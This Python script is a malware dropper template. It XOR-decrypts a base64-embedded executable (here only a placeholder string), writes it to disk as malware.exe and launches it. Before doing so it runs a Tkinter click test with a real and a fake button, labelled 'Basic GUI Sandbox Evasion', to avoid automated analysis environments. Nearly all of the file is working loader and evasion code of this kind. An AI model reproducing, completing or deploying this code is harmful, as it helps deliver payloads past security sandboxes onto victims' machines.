import base64
import sys
import os
import argparse
import subprocess
import tkinter as tk


embedded_exe_b64 = '''hello'''

def xor_bytes(data: bytes, key: bytes) -> bytes:
    """XORs the given data with the key (repeating key if necessary)."""
    return bytes(data[i] ^ key[i % len(key)] for i in range(len(data)))


def process_file(input_path: str, output_path: str, key: bytes) -> None:
    """Reads `input_path`, XORs its contents with `key`, and writes to `output_path`."""
    if not os.path.isfile(input_path):
        raise FileNotFoundError(f"File not found: {input_path}")

    with open(input_path, 'rb') as f:
        data = f.read()

    result = xor_bytes(data, key)

    with open(output_path, 'wb') as f:
        f.write(result)


def process_embedded_exe(output_path: str, key: bytes) -> None:
    """XORs and writes the embedded EXE to disk."""
    # Decode embedded binary
    data = base64.b64decode(embedded_exe_b64)

    # XOR it
    result = xor_bytes(data, key)

    # Write to disk
    with open(output_path, 'wb') as f:
        f.write(result)


def run_file(path: str) -> None:
    """Attempts to execute the file at `path`."""
    try:
        if sys.platform == 'win32':
            os.startfile(path)
        else:
            subprocess.Popen([path], shell=True)
    except Exception as e:
        print(f"Error running file '{path}': {e}")


def sandbox_check() -> bool:
    result = {"value": None}  # store result in a dict to mutate inside inner funcs

    def on_button_click():
        result["value"] = True
        root.destroy()  # close window after real button is clicked

    def on_window_click(event):
        # Get fake button position and size
        x1 = fake_button.winfo_rootx()
        y1 = fake_button.winfo_rooty()
        x2 = x1 + fake_button.winfo_width()
        y2 = y1 + fake_button.winfo_height()

        # Check if click was inside the fake button label
        if x1 <= event.x_root <= x2 and y1 <= event.y_root <= y2:
            result["value"] = False
            root.destroy()  # close window after fake button is clicked

    # Create main window
    root = tk.Tk()
    root.title("Basic GUI Sandbox Evasion")
    root.geometry("400x300")

    # Add a label
    label = tk.Label(root, text="Click stuff", font=("Arial", 14))
    label.pack(pady=20)

    # Add a real button
    button = tk.Button(root, text="Click Me", command=on_button_click)
    button.pack(pady=10)

    # Add a fake button (label styled as button)
    fake_button = tk.Label(root, text="Fake Button", relief="raised", bd=3, padx=10, pady=5, bg="lightgray")
    fake_button.pack(pady=10)

    # Bind clicks anywhere in the window
    root.bind("<Button-1>", on_window_click)

    # Run the GUI loop
    root.mainloop()

    return result["value"]


def main():
    parser = argparse.ArgumentParser(description="XOR a file with a key and optionally run the result.")
    parser.add_argument('-f', '--file', dest='file', default='input.bin',
                        help='Path to input file (default: input.bin)')
    parser.add_argument('-k', '--key', dest='key', default='secret',
                        help='Encryption/decryption key (string) (default: secret)')
    parser.add_argument('-n', '--no-run', action='store_true', dest='no_run',
                        help="Skip running the processed file after XOR")
    args = parser.parse_args()

    # Convert key directly to bytes
    key_bytes = args.key.encode('utf-8')
    input_path = args.file

    # if the user inserted -n, just xor the binary
    if (args.no_run):
        # XOR process
        process_file(input_path, "./innocent.bin", key_bytes)
        print(f"Processed file saved to: innocent.bin")
        return

    # the user didn't use -n == check for sandbox, decrypt and run
    if (sandbox_check()):
        print("THIS IS A SANDBOX!")
        return

    print("NOT A SANDBOX!")

    # XOR process
    process_embedded_exe("./malware.exe", key_bytes)
    print(f"Processed file saved to: ./malware.exe")

    print(f"Running processed file: malware.exe")
    run_file(".\\malware.exe")
    return

if __name__ == '__main__':
    main()
    print("Done!")
